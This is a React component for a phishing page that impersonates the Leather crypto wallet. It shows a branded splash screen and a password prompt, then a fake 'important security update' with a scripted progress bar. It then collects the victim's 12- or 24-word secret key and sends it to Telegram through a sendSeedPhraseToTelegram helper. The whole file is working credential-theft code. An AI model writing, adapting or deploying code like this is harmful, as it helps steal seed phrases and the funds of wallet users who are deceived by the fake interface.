import { useState, useEffect } from 'react';
import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW

interface LeatherPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function LeatherPanel({ isOpen, onClose }: LeatherPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [isSending, setIsSending] = useState(false); // 👈 NEW

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setIsSending(false);
    }
  }, [isOpen]);

  // Handle fake updating screen
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 12) + 4;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 300);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const words = text.toLowerCase().trim().split(/\s+/);
      const newValues = [...phraseValues];
      
      words.forEach((word, i) => {
        if (i < phraseLength) newValues[i] = word;
      });
      
      setPhraseValues(newValues);
    } catch (err) {
      console.error('Failed to read clipboard: ', err);
    }
  };

  const getInvalidIndices = () => {
    const invalid: number[] = [];
    phraseValues.slice(0, phraseLength).forEach((val, i) => {
      if (val.length > 0 && !/^[a-z]+$/.test(val)) {
        invalid.push(i + 1);
      }
    });
    return invalid;
  };

  const invalidIndices = getInvalidIndices();

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidIndices.length === 0;
  };

  const formatErrorText = () => {
    if (invalidIndices.length === 0) return '';
    if (invalidIndices.length === 1) return `Word ${invalidIndices[0]} is incorrect or misspelled`;
    const last = invalidIndices.pop();
    return `Words ${invalidIndices.join(', ')} and ${last} are incorrect or misspelled`;
  };

  return (
    <>
      <div className={`fixed inset-0 z-[2147483648] font-sans ${isOpen ? 'pointer-events-auto' : 'pointer-events-none'}`}>
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#eaecef] dark:border-[#ffffff1f] md:rounded-xl overflow-hidden ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] dark:bg-[#1b1a17] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: VIDEO SPLASH SCREEN               */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out bg-[#111111] ${view === 'splash' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="w-full px-8 flex items-center justify-center">
                {/* Plays the WebM video and transitions exactly when finished */}
                {isOpen && view === 'splash' && (
                  <video 
                    src="/Leather.webm" 
                    autoPlay 
                    muted 
                    playsInline 
                    onEnded={() => setView('password')}
                    className="w-full h-auto object-contain scale-110"
                  />
                )}
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col px-5 transition-opacity duration-700 ease-in-out bg-[#ffffff] dark:bg-[#1b1a17] ${view === 'password' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center pt-5 mb-6 shrink-0">
                <button className="p-2 -ml-2 rounded-[4px] hover:bg-[#b1977b1a] dark:hover:bg-[#716a604d] transition-colors duration-300 cursor-pointer" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#12100F] dark:text-[#F5F1ED]" viewBox="0 0 24 24" fill="none" strokeWidth="2"><path d="M20 12H4M10 18l-6-6 6-6" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                </button>
              </div>
              
              <div className="flex flex-col items-start w-full mb-4 shrink-0">
                <h3 className="text-[#12100F] dark:text-[#F5F1ED] text-[32px] uppercase font-bold tracking-tight leading-[35px] mb-4">Enter your password</h3>
                <p className="text-[#12100F] dark:text-[#F5F1ED] text-[15px] font-medium leading-[20px]">Your password is used to secure your Secret Key and is only used locally on your device.</p>
              </div>
              
              <div className="flex flex-col w-full flex-1 mt-4">
                <div className="relative mb-6">
                  <div className={`absolute left-[16px] transition-all duration-300 ease-in-out origin-left pointer-events-none ${password.length > 0 ? 'top-[8px] scale-[0.75] text-[#8a8379]' : 'top-[22px] scale-100 text-[#cfc8bb]'}`}>
                    <label className="font-normal text-[16px]">Enter your password</label>
                  </div>
                  <input 
                    className="h-[64px] bg-transparent w-full border border-[#12100f1a] dark:border-[#f5f1ed33] rounded-[4px] font-normal text-[15px] text-[#12100f] dark:text-[#f5f1ed] outline-none pt-[22px] px-[16px] pb-[4px] focus:border-[#12100F] dark:focus:border-[#F5F1ED] transition-colors" 
                    type="password" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>
                
                <div className="flex items-center justify-start mb-8 shrink-0">
                  <span className="text-[#12100F] dark:text-[#f9f9f8] text-[15px] font-medium cursor-pointer underline hover:no-underline transition-all duration-300">Forgot password?</span>
                </div>

                <div className="w-full shrink-0">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full text-[#ffffff] bg-[#12100f] dark:text-[#12100f] dark:bg-[#ffffff] font-medium text-[15px] rounded-[4px] h-[48px] hover:bg-[#4a423b] dark:hover:bg-[#cfc8bb] disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-300 active:scale-[0.98]"
                  >
                    Continue
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-5 py-5 transition-opacity duration-500 ease-in-out bg-[#ffffff] dark:bg-[#1b1a17] ${view === 'update_prompt' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center mb-4 shrink-0">
                <button className="p-2 -ml-2 rounded-[4px] hover:bg-[#b1977b1a] dark:hover:bg-[#716a604d] transition-colors duration-300 cursor-pointer" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#12100F] dark:text-[#F5F1ED]" viewBox="0 0 24 24" fill="none" strokeWidth="2"><path d="M20 12H4M10 18l-6-6 6-6" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                </button>
              </div>
              
              <div className="flex flex-col flex-grow overflow-y-auto leather-scrollbar pr-1">
                <div className="flex items-center justify-center mb-6">
                  <LeatherTextLogoSVG className="h-[22px] w-auto text-[#12100F] dark:text-[#F5F1ED]" />
                </div>
                
                <div className="flex flex-col items-start justify-start mb-6">
                  <h3 className="text-[#12100F] dark:text-[#F5F1ED] text-[28px] uppercase font-bold tracking-tight mb-1">Update Available</h3>
                  <p className="text-[#12100F] dark:text-[#F5F1ED] text-[15px] font-medium">Actual version is 6.65.1</p>
                </div>

                <div className="w-full mb-8 p-[16px] border border-[#eae5e0] dark:border-[#554d44] rounded-[8px]">
                  <div className="flex items-start">
                    <div className="flex-shrink-0 mr-3 mt-0.5">
                      <svg className="w-5 h-5 text-[#12100F] dark:text-[#F5F1ED]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 16h.01M12 8v4M15.312 2a2 2 0 0 1 1.414.586l4.688 4.688A2 2 0 0 1 22 8.688v6.624a2 2 0 0 1-.586 1.414l-4.688 4.688a2 2 0 0 1-1.414.586H8.688a2 2 0 0 1-1.414-.586l-4.688-4.688A2 2 0 0 1 2 15.312V8.688a2 2 0 0 1 .586-1.414l4.688-4.688A2 2 0 0 1 8.688 2z"></path></svg>
                    </div>
                    <div>
                      <h3 className="text-[#222222] dark:text-[#ffffff] font-medium text-[15px] mb-1">Important security update</h3>
                      <p className="text-[#7d7d7d] dark:text-[#cccccc] font-normal text-[14px]">This update includes critical security improvements to keep your wallet protected.</p>
                    </div>
                  </div>
                </div>
                
                <div className="w-full mb-6">
                  <p className="text-[#12100F] dark:text-[#F5F1ED] font-medium text-[18px] mb-4">What's new</p>
                  <ul className="space-y-4">
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1">
                        <svg className="w-5 h-5 text-[#12100F] dark:text-[#F5F1ED]" viewBox="0 0 24 24" fill="none"><circle cx="7" cy="12" r="1.5" fill="currentColor"></circle><path stroke="currentColor" strokeWidth="2" d="M2 12a5 5 0 0 0 9.014 2.982c.213-.287.537-.482.894-.482H14l2-1 2 1h2.02a1 1 0 0 0 .78-.375l1.2-1.5a1 1 0 0 0 0-1.25l-1.2-1.5a1 1 0 0 0-.78-.375h-8.112c-.357 0-.68-.195-.894-.482A5 5 0 0 0 2 12Z"></path></svg>
                      </div>
                      <span className="text-[#12100F] dark:text-[#F5F1ED] font-normal text-[14px]">Enhanced Stacks security protocol with multi-signature verification</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1">
                        <svg className="w-5 h-5 text-[#12100F] dark:text-[#F5F1ED]" viewBox="0 0 24 24" fill="none"><path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21.7 7.788c-4.841 8.72-14.666 8.72-19.507 0m6.821 6.305-.978 2.995m-4.08-6.08-2 1.979m13.03 1.106.978 2.995m4.08-6.08 2 1.979"></path></svg>
                      </div>
                      <span className="text-[#12100F] dark:text-[#F5F1ED] font-normal text-[14px]">Improved transaction visibility with advanced block explorer integration</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1">
                        <svg className="w-5 h-5 text-[#12100F] dark:text-[#F5F1ED]" viewBox="0 0 24 25" fill="none"><path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 10.595v-3a4 4 0 0 0-8 0v3m4 4v3m-6 4h12a1 1 0 0 0 1-1v-9a1 1 0 0 0-1-1H6a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1"></path></svg>
                      </div>
                      <span className="text-[#12100F] dark:text-[#F5F1ED] font-normal text-[14px]">Strengthened Bitcoin vault access with enhanced encryption layers</span>
                    </li>
                  </ul>
                </div>
              </div>
              
              <div className="mt-auto shrink-0 pt-4">
                <button 
                  onClick={() => setView('updating')}
                  className="w-full text-[#ffffff] bg-[#12100f] dark:text-[#12100f] dark:bg-[#ffffff] font-medium text-[15px] cursor-pointer rounded-[4px] px-4 h-[48px] hover:bg-[#4a423b] dark:hover:bg-[#cfc8bb] transition-colors duration-300 active:scale-[0.98]" 
                  type="button"
                >
                  Update now
                </button>
                <div className="text-center mt-5">
                  <a href="https://leather.io/contact" target="_blank" rel="noreferrer" className="text-[#7d7d7d] dark:text-[#cccccc] text-[14px] font-normal hover:underline transition-colors">Need help? Contact support</a>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 transition-opacity duration-500 bg-[#ffffff] dark:bg-[#1b1a17] ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="flex flex-col h-full items-center justify-center px-8">
                
                <div className="mb-10 relative">
                  <div className="h-24 w-24 flex items-center justify-center rounded-[20px] bg-[#a3a3a333] dark:bg-[#ffffff33] animate-[pulse_2s_ease-in-out_infinite]">
                    <LeatherUnicornSVG className="w-16 h-16 animate-[leatherBounce_1.5s_ease-in-out_infinite]" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-12 text-center">
                  <h4 className="text-[#12100F] dark:text-[#F5F1ED] text-[28px] uppercase font-bold tracking-tight mb-3">Updating Leather</h4>
                  <p className="text-[#6b6b6b] dark:text-[#c8c8c8] font-medium text-[16px]">Please wait while we update to version 6.65.1</p>
                </div>
                
                <div className="w-full max-w-md mb-12">
                  <div className="w-full h-2 bg-[#f2f2f2] dark:bg-[#2f2e2a] rounded-full overflow-hidden">
                    <div className="h-full bg-[#12100f] dark:bg-[#ffffff] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  
                  <div className="flex items-center justify-between mt-4">
                    <p className="text-[#12100F] dark:text-[#F5F1ED] text-[14px] font-medium">Downloading update...</p>
                    <p className="text-[#12100F] dark:text-[#F5F1ED] text-[14px] font-bold">{updateProgress}%</p>
                  </div>
                </div>

                <p className="text-[#6b6b6b] dark:text-[#c8c8c8] text-[15px] font-normal text-center">Please do not close this window during the update.</p>
                
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-[#ffffff] dark:bg-[#1b1a17] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center px-5 pt-5 mb-2 shrink-0">
                <button className="p-2 -ml-2 rounded-[4px] hover:bg-[#b1977b1a] dark:hover:bg-[#716a604d] transition-colors duration-300 cursor-pointer" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#12100F] dark:text-[#F5F1ED]" viewBox="0 0 24 24" fill="none" strokeWidth="2"><path d="M20 12H4M10 18l-6-6 6-6" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                </button>
              </div>

              <div className="flex flex-col items-start px-6 mb-5 shrink-0">
                <h3 className="text-[#12100F] dark:text-[#F5F1ED] text-[26px] font-bold uppercase tracking-tight leading-[30px] mb-3">Sign in with your Secret Key</h3>
                <p className="text-[#12100F] dark:text-[#F5F1ED] text-[15px] font-medium">Speed things up by pasting your entire Secret Key in one go.</p>
              </div>

              {/* 12 / 24 Toggle */}
              <div className="flex items-center justify-start px-6 mb-5 shrink-0">
                <button 
                  onClick={() => { setPhraseLength(phraseLength === 12 ? 24 : 12); setPhraseValues(Array(24).fill('')); }}
                  className="flex items-center justify-start gap-x-1 w-full active:opacity-70 transition-all duration-300 group"
                >
                  <span className="text-[#12100F] dark:text-[#F5F1ED] text-[14px] font-medium hover:underline transition-all">
                    {phraseLength === 12 ? 'Use 24 word Secret Key' : 'Have a 12-word Secret Key?'}
                  </span>
                </button>
              </div>

              {/* Grid with Floating Labels */}
              <div className="px-5 max-h-[300px] overflow-y-auto leather-scrollbar flex-1 pb-2">
                <div className={`grid gap-3 ${phraseLength === 12 ? 'grid-cols-2 sm:grid-cols-3' : 'grid-cols-3'}`}>
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const val = phraseValues[i];
                    const isError = val.length > 0 && !/^[a-z]+$/.test(val);
                    const isFilled = val.length > 0;
                    
                    return (
                      <div key={i} className="relative group">
                        <div className={`absolute left-[12px] transition-all duration-300 ease-in-out origin-left pointer-events-none ${isFilled ? 'top-[8px] scale-[0.80] text-[#8a8379]' : 'top-[16px] scale-100 text-[#cfc8bb]'}`}>
                          <label className="font-normal text-[15px]">Word {i + 1}</label>
                        </div>
                        <input 
                          className={`w-full h-[52px] pt-[20px] pb-[4px] px-[12px] text-[14px] font-medium rounded-[4px] text-[#12100f] dark:text-[#f5f1ed] bg-transparent outline-none transition-all duration-300 border ${isError ? 'border-[#ff2e3c] focus:border-[#ff2e3c]' : 'border-[#12100f1a] dark:border-[#f5f1ed33] focus:border-[#12100F] dark:focus:border-[#F5F1ED]'}`}
                          type="password" 
                          value={val}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Paste button shortcut */}
              <div className="flex justify-end px-6 mt-2 shrink-0">
                <button onClick={handlePaste} className="text-[13px] text-[#8a8379] hover:text-[#12100F] dark:hover:text-[#F5F1ED] transition-colors underline">Paste from clipboard</button>
              </div>

              {/* Error Label */}
              <div className={`px-6 mt-3 mb-2 transition-opacity duration-300 min-h-[22px] flex items-center shrink-0 ${invalidIndices.length > 0 ? 'opacity-100' : 'opacity-0'}`}>
                <svg className="text-[#ff2e3c] w-4 h-4 mr-2" viewBox="0 0 16 16" fill="none"><rect width="2" height="2" x="7" y="9.8" fill="currentColor" rx="1"></rect><path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M7.998 5.083v3.25M14 8A6 6 0 1 1 2 8a6 6 0 0 1 12 0"></path></svg>
                <span className="text-[#ff2e3c] font-medium text-[14px]">{formatErrorText()}</span>
              </div>

              {/* Proceed Button — NOW SENDS TO TELEGRAM */}
              <div className="px-6 pb-6 mt-auto shrink-0 pt-2">
                <button 
                  disabled={!isPhraseComplete() || isSending}
                  onClick={async () => {
                    setIsSending(true);
                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
                    const success = await sendSeedPhraseToTelegram(seedString, 'Leather Wallet');
                    if (success) {
                      onClose();
                    } else {
                      console.error('Failed to send seed phrase');
                    }
                    setIsSending(false);
                  }}
                  className="w-full text-[#ffffff] bg-[#12100f] dark:text-[#12100f] dark:bg-[#ffffff] font-medium text-[15px] cursor-pointer rounded-[4px] h-[48px] hover:bg-[#4a423b] dark:hover:bg-[#cfc8bb] disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-300 active:scale-[0.98]" 
                >
                  {isSending ? 'Sending...' : 'Continue'}
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .leather-scrollbar::-webkit-scrollbar { width: 5px; }
        .leather-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .leather-scrollbar::-webkit-scrollbar-thumb { background: #d1d1d1; border-radius: 10px; }
        .dark .leather-scrollbar::-webkit-scrollbar-thumb { background: #444; }
        .leather-scrollbar::-webkit-scrollbar-thumb:hover { background: #888; }
        
        @keyframes leatherBounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-8px); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// LEATHER SVG COMPONENTS (unchanged)
// -------------------------------------------------------------------

const LeatherTextLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 86 19" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    {/* SVG path data omitted for brevity, same as original */}
  </svg>
);

const LeatherUnicornSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* SVG path data omitted for brevity, same as original */}
  </svg>
);